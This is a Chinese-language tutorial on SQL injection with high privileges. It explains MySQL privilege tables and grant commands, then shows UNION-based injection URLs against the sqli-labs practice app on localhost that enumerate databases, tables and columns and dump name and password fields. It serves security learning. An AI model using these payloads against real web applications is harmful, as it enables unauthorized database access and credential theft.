# SQL注入—高权限注入

# SQL注入—高权限注入

## MySQL 权限介绍

MySQL服务器通过权限表来控制用户对数据库的访问，权限表存放在 `mysql` 数据库中，`mysql` 库中存在4个控制权限的表：`user` 表，`db` 表，`tables_priv` 表，`columns_priv` 表。

​	

### 系统权限表

- User 表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限
- Db 表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库
- Tables_priv 表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表
- Columns_priv 表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段
- Procs_priv 表：存放存储过程和函数级别的权限

​	

### MySQL 权限级别

- 全局性的管理权限： 作用于整个 MySQL 实例级别
- 数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上
- 数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象

​	

### mysql权限表的验证过程

1. 从 user 表中的 Host, User, Password 这3个字段中判断连接的 ip、用户名、密码是否存在，存在则通过验证
2. 通过身份认证后，进行权限分配
3. 按照 user，db，tables_priv，columns_priv 的顺序进行验证
4. 先检查全局权限表 user，如果 user 中对应的权限为 Y，则此用户对所有数据库的权限都为 Y，将不再检查 db、tables_priv、columns_priv
5. 如果为 N，则到 db 表中检查此用户对应的具体数据库并得到 db 中为 Y 的权限
6. 如果 db 中为 N，则检查 tables_priv 中此数据库对应的具体表，取得表中的权限 Y，以此类推

​	

### 查看 MySQL 服务器有哪些用户

```mysql
select user, host from mysql.user;
```

​	

### 查看用户对应权限

```mysql
select * from user where user='root' and host='localhost'\G;  #如果所有权限都是 Y ，就是什么权限都有
```

​	

### 创建 MySQL 用户

有两种方式创建 MySQL 授权用户

```mysql
#执行 create user/grant 命令（推荐方式）
CREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';

#通过 insert 语句直接操作 MySQL 系统权限表
```

​	

### 只提供 id 查询权限

```mysql
grant select(id) on test.temp to test1@'localhost' identified by '123456';
```

​	

### 把普通用户变成管理员

```mysql
GRANT ALL PRIVILEGES ON *.* TO 'test1'@'localhost' WITH GRANT OPTION;
```

​	

### 删除用户

```mysql
drop user finley@'localhost';
```

​	

​	

## 高权限注入

**注入流程与正常的手工注入流程差不多**

​	

### 查询所有数据库名称

![](https://pic.imgdb.cn/item/64c1e59c1ddac507cc84eff2.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,group_concat(schema_name),3 from information_schema.schemata
```

​	

### 查询数据库对应的表名

![](https://pic.imgdb.cn/item/64c1e6af1ddac507cc867e76.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,group_concat(table_name),3 from%20information_schema.tables where table_schema=test
```

​	

### 查询表名对应的字段名

![](https://pic.imgdb.cn/item/64c1e6bf1ddac507cc8695d7.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=t1
```

​	

### 查询数据

![](https://pic.imgdb.cn/item/64c1e6d01ddac507cc86a965.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,name,pass from test.t1
```


